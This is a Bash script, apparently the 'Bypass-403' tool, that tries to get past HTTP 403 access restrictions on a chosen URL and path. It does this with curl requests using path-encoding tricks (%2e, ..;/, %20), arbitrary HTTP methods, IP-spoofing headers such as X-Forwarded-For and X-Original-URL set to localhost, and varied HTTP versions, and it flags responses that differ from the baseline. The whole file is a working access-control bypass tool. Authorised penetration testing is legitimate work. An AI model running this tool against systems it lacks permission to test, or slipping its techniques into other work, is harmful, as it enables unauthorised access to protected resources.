#!/usr/bin/env bash

SCRIPT_PATH="$0"

# user parameters
TARGET_URL=""
TARGET_PATH=""
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0"
TECHNIQUES="methods,headers,pathfuzz,httpversions,waybackmachine"
HEADER_IPS="10.0.0.0,10.0.0.1,127.0.0.1,127.0.0.1:443,127.0.0.1:80,localhost,172.16.0.0"
HTTP_METHODS="GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH,FOO"
HEADERS="X-Forwarded-For,X-Forward-For,X-Forwarded-Host,X-Forwarded-Proto,Forwarded,Via,X-Real-IP,X-Remote-IP,X-Remote-Addr,X-Trusted-IP,X-Requested-By,X-Requested-For,X-Forwarded-Server,X-Custom-IP-Authorization,X-Originating-IP,X-Client-IP,Forwarded-For,X-ProxyUser-Ip,X-Original-URL,Client-IP,True-Client-IP,Cluster-Client-IP,X-rewrite-url,X-Host"
NO_WAYBACK=""
STATUS_CODE_FILTER="403"
RESPONSE_SIZE_FILTER=""
OUTPUT_COLORS=""
OUTPUT_COMMANDS=""
ERRORS=""
# Colors
CLEAR="\033[0m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"


help_menu () {
	echo "usage:"
	echo -ne "\t-h, --help\tshow this menu\n"
	echo -ne "\t-u\t\ttarget url (without '/' at the end -> https://example.com)\n"
	echo -ne "\t-p\t\ttarget path\n"
	echo -ne "\t-a\t\tuser agent to use in requests (default: '${USER_AGENT}')\n"
	echo -ne "\t-c\t\toutput with colors\n"
	echo -ne "\t-t\t\ttechniques to use (default: ${TECHNIQUES})\n"
	echo -ne "\t-m\t\tHTTP methods to try with 'methods' technique (default: ${HTTP_METHODS})\n"
	echo -ne "\t-i\t\tIPs to try with each header in the 'headers' technique (default: ${HEADER_IPS})\n"
	echo -ne "\t-x\t\tHeaders to try with the 'headers' technique (default: ${HEADERS})\n"
	echo -ne "\t-w\t\tDon't use waybackmachine technique\n"
	echo -ne "\t-st\t\tStatus Codes to filter out (default: 403)\n"
	echo -ne "\t-rs\t\tResponse Sizes to filter out\n"
	echo ""
	echo "examples:"
	echo -ne "\t $SCRIPT_PATH -h\n"
	echo -ne "\t $SCRIPT_PATH -u https://example.com -p secret -w\n"
	echo -ne "\t $SCRIPT_PATH -c -i company.vpn,127.0.0.1 -rs 364,4365 -st 403,404,500,405 -m GET,POST,FOO -t headers,methods -x X-Forwarded-For,X-Original-URL -u https://example.com/forbiddendir/admin -p secret\n"
	echo -ne "\t $SCRIPT_PATH -u https://example.com -p secret -a \"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/136.0 Mobile/15E148 Safari/605.1.15\"\n"
}


print_banner() {
	if [ -n "$OUTPUT_COLORS" ]; then
    	echo -e "${GREEN} ____                                  _  _    ___ _____"
		echo "| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ /"
		echo "|  _ \| | | | '_ \ / _\` / __/ __|_____| || |_| | | ||_ \\"
		echo "| |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |"
		echo "|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/"
		echo "       |___/|_|                                         "
		echo -e "${CLEAR}"
	else
		echo " ____                                  _  _    ___ _____"
		echo "| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ /"
		echo "|  _ \| | | | '_ \ / _\` / __/ __|_____| || |_| | | ||_ \\"
		echo "| |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |"
		echo "|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/"
		echo "       |___/|_|                                         "
		echo ""
	fi
}

# No arguments
if [ "$#" -lt 1 ]; then
	print_banner
	help_menu
	exit 0
fi

# Help
if [[ "$*" == *"-h"* || "$*" == *"--help"* ]]
then
	print_banner
	help_menu
	exit 0
fi

# Iterating over arguments
while test $# -gt 0
do
	case "$1" in
		-u) TARGET_URL="$2"
			;;
		-p) TARGET_PATH="$2"
			;;
		-a) USER_AGENT="$2"
			;;
		-c) OUTPUT_COLORS="true"
			;;
		-t) TECHNIQUES="$2"
			;;
		-i) HEADER_IPS="$2"
			;;
		-m) HTTP_METHODS="$2"
			;;
		-x) HEADERS="$2"
			;;
		-w) NO_WAYBACK="true"
			;;
		-st) STATUS_CODE_FILTER="$2"
			;;
		-rs) RESPONSE_SIZE_FILTER="$2"
			;;
	esac
	shift
done

print_banner

# Validating arguments
if [ -z "$TARGET_URL" ]; then
	if [ -n "$OUTPUT_COLORS" ]; then
		echo -e "${RED}error:${CLEAR} Target URL not provided (-u)"
	else
		echo -e "error: Target URL not provided (-u)"
	fi
	echo ""
	ERRORS="yup"
fi

# Validating arguments
if [ -z "$TARGET_PATH" ]; then
	if [ -n "$OUTPUT_COLORS" ]; then
		echo -e "${RED}error:${CLEAR} Target path not provided (-p)"
	else
		echo -e "error: Target path not provided (-p)"
	fi
	echo ""
	ERRORS="yup"
fi

# Remove waybackmachine method if user requested
if [ -n "$NO_WAYBACK" ]; then
	TMP_TECHNIQUES=$(echo "$TECHNIQUES" | sed 's/waybackmachine//g' | sed 's/,,*/,/g' | sed 's/,*$//' | sed 's/^,//' )
	TECHNIQUES=$TMP_TECHNIQUES
fi

# Validating arguments
# Save the original IFS value
OLD_IFS=$IFS
IFS=',' read -r -a TECHNIQUES_ARRAY <<< "$TECHNIQUES"
# Restore the original IFS value
IFS=$OLD_IFS
for t in "${TECHNIQUES_ARRAY[@]}"; do
  if [[ "$t" != "httpversions" && "$t" != "pathfuzz" && "$t" != "headers" && "$t" != "methods" && "$t" != "waybackmachine" ]]; then
    	if [ -n "$OUTPUT_COLORS" ]; then
			echo -e "${RED}error:${CLEAR} Unknown technique provided ${YELLOW}\"$t\"${CLEAR}"
		else
			echo -e "error: Unknown technique provided \"$t\""
		fi
    ERRORS="yup"
  fi
done
echo ""

# Validating arguments
TMP_HEADER_IPS=$(echo "$HEADER_IPS" | sed 's/,,*/,/g' | sed 's/,*$//' | sed 's/^,//' )
HEADER_IPS=$TMP_HEADER_IPS
OLD_IFS=$IFS
IFS=',' read -r -a HEADER_IPS_ARRAY <<< "$HEADER_IPS"
# Restore the original IFS value
IFS=$OLD_IFS

# Validating arguments
TMP_HTTP_METHODS=$(echo "$HTTP_METHODS" | sed 's/,,*/,/g' | sed 's/,*$//' | sed 's/^,//' )
HTTP_METHODS=$TMP_HTTP_METHODS
OLD_IFS=$IFS
IFS=',' read -r -a HTTP_METHODS_ARRAY <<< "$HTTP_METHODS"
# Restore the original IFS value
IFS=$OLD_IFS

# Validating arguments
TMP_HEADERS=$(echo "$HEADERS" | sed 's/,,*/,/g' | sed 's/,*$//' | sed 's/^,//' )
HEADERS=$TMP_HEADERS
OLD_IFS=$IFS
IFS=',' read -r -a HEADERS_ARRAY <<< "$HEADERS"
# Restore the original IFS value
IFS=$OLD_IFS

# Validating arguments
TMP_STATUS_CODE_FILTER=$(echo "$STATUS_CODE_FILTER" | sed 's/,,*/,/g' | sed 's/,*$//' | sed 's/^,//' )
STATUS_CODE_FILTER=$TMP_STATUS_CODE_FILTER
OLD_IFS=$IFS
IFS=',' read -r -a STATUS_CODE_FILTER_ARRAY <<< "$STATUS_CODE_FILTER"
# Restore the original IFS value
IFS=$OLD_IFS

# Validating arguments
TMP_RESPONSE_SIZE_FILTER=$(echo "$RESPONSE_SIZE_FILTER" | sed 's/,,*/,/g' | sed 's/,*$//' | sed 's/^,//' )
RESPONSE_SIZE_FILTER=$TMP_RESPONSE_SIZE_FILTER
OLD_IFS=$IFS
IFS=',' read -r -a RESPONSE_SIZE_FILTER_ARRAY <<< "$RESPONSE_SIZE_FILTER"
# Restore the original IFS value
IFS=$OLD_IFS


if [ -n "$ERRORS" ]; then
	help_menu
	exit 0
fi


if [ -n "$OUTPUT_COLORS" ]; then
	echo -e "Target URL: ${YELLOW}${TARGET_URL}${CLEAR}"
	echo -e "Target PATH: ${YELLOW}${TARGET_PATH}${CLEAR}"
	echo -e "User-Agent: ${YELLOW}${USER_AGENT}${CLEAR}"
	echo -e "Techniques: ${YELLOW}${TECHNIQUES}${CLEAR}"
	if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"headers"[[:space:]] ]]; then
		echo -e "Headers: ${YELLOW}${HEADERS}${CLEAR}"
		echo -e "Headers Values: ${YELLOW}${HEADER_IPS}${CLEAR}"
	fi
	if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"methods"[[:space:]] ]]; then
		echo -e "HTTP Methods: ${YELLOW}${HTTP_METHODS}${CLEAR}"
	fi
	echo -e "Status Code Filters: ${YELLOW}${STATUS_CODE_FILTER}${CLEAR}"
	echo -e "Response Size Filters: ${YELLOW}${RESPONSE_SIZE_FILTER}${CLEAR}"
else
	echo -e "Target URL: $TARGET_URL"
	echo -e "Target PATH: $TARGET_PATH"
	echo -e "User-Agent: $USER_AGENT"
	echo -e "Techniques: $TECHNIQUES"
	if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"headers"[[:space:]] ]]; then
		echo -e "Headers: $HEADERS"
		echo -e "Headers Values: $HEADER_IPS"
	fi
	if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"methods"[[:space:]] ]]; then
		echo -e "HTTP Methods: $HTTP_METHODS"
	fi
	echo -e "Status Code Filters: $STATUS_CODE_FILTER"
	echo -e "Response Size Filters: $RESPONSE_SIZE_FILTER"
fi
echo ""

function shuffle_array
{
	commands_shuffled=( "$@" )
	local idx rand_idx tmp
	for ((idx=$#-1; idx>0 ; idx--)) ; do
		rand_idx=$(( RANDOM % (idx+1) ))
		# Swap if the randomly chosen item is not the current item
		if (( rand_idx != idx )) ; then
			tmp=${commands_shuffled[idx]}
			commands_shuffled[idx]=${commands_shuffled[rand_idx]}
			commands_shuffled[rand_idx]=$tmp
		fi
	done
}


COMMANDS=()

if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"pathfuzz"[[:space:]] ]]; then
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/%2e/${TARGET_PATH}\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}/.\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}//${TARGET_PATH}//\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/./${TARGET_PATH}/./\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}%20\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}%09\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}?\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}.html\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}/?anything\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}#\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}/*\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}.php\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}.json\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}..;/\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH};/\"")
fi

if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"methods"[[:space:]] ]]; then
	for method in "${HTTP_METHODS_ARRAY[@]}"; do
		COMMANDS+=("curl -k -s -o /dev/null -iL -X ${method} -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}\"")
	done
fi

if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"headers"[[:space:]] ]]; then
	for header in "${HEADERS_ARRAY[@]}"; do
		for ip in "${HEADER_IPS_ARRAY[@]}"; do
			COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"${header}: ${ip}\" -H \"User-Agent: ${USER_AGENT}\" \"${TARGET_URL}/${TARGET_PATH}\"")
		done
	done
fi

if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"httpversions"[[:space:]] ]]; then
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" --http1.0 \"${TARGET_URL}/${TARGET_PATH}\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" --http1.1 \"${TARGET_URL}/${TARGET_PATH}\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" --http2 \"${TARGET_URL}/${TARGET_PATH}\"")
	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" --http2-prior-knowledge \"${TARGET_URL}/${TARGET_PATH}\"")
	# http3 only supports https (check if https:// is in TARGET_URL)
	# commented out cause not all libcurl versions support this
	# if [[ $TARGET_URL == *"https://"* ]]; then
	# 	COMMANDS+=("curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" --http3 \"${TARGET_URL}/${TARGET_PATH}\"")
	# fi
fi

declare -a commands_shuffled
shuffle_array "${COMMANDS[@]}"
# declare -p commands_shuffled  # print array

# Check wayback machine first
if [[ " ${TECHNIQUES_ARRAY[*]} " =~ [[:space:]]"waybackmachine"[[:space:]] ]]; then
	echo -ne "Checking for URL existence in WaybackMachine\n"
	cmd="curl -s -H \"User-Agent: ${USER_AGENT}\" \"https://archive.org/wayback/available?url=${TARGET_URL}/${TARGET_PATH}\" | jq -r '.archived_snapshots.closest | {available, url}'"
	echo -ne "${cmd}\n"
	eval $cmd
	echo ""
fi

# Execute commands
echo -ne "====================\n"
echo -ne "= Running Commands =\n"
echo -ne "====================\n"
echo -ne "\nSTATUS\tSIZE\tCOMMAND\n"
# Start with normal request
cmd="curl -k -s -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" -H \"User-Agent: ${USER_AGENT}\" ${TARGET_URL}/${TARGET_PATH}"
output=$(eval $cmd)
normal_status_code=$(echo "$output" | cut -d',' -f1)
normal_response_size=$(echo "$output" | cut -d',' -f2)
echo -ne "${normal_status_code}\t${normal_response_size}\t${cmd}\n\n"

# Execute other commands from array
for cmd in "${commands_shuffled[@]}"; do
	output=$(eval $cmd)
	status_code=$(echo "$output" | cut -d',' -f1)
	response_size=$(echo "$output" | cut -d',' -f2)

	if [[ " ${RESPONSE_SIZE_FILTER_ARRAY[*]} " =~ [[:space:]]"$response_size"[[:space:]] || " ${STATUS_CODE_FILTER_ARRAY[*]} " =~ [[:space:]]"$status_code"[[:space:]] ]]; then
		continue
	fi

	if [ -n "$OUTPUT_COLORS" ]; then
		if [[ "$normal_status_code" != "$status_code" ]]; then
			echo -ne "${GREEN}${status_code}${CLEAR}\t"
		else
			echo -ne "${status_code}\t"
		fi
		if [[ "$normal_response_size" != "$response_size" ]]; then
			echo -ne "${GREEN}${response_size}${CLEAR}\t"
		else
			echo -ne "${response_size}\t"
		fi
		echo -ne "${cmd}\n\n"
	else
		echo -ne "${status_code}\t${response_size}\t${cmd}\n\n"
	fi
done
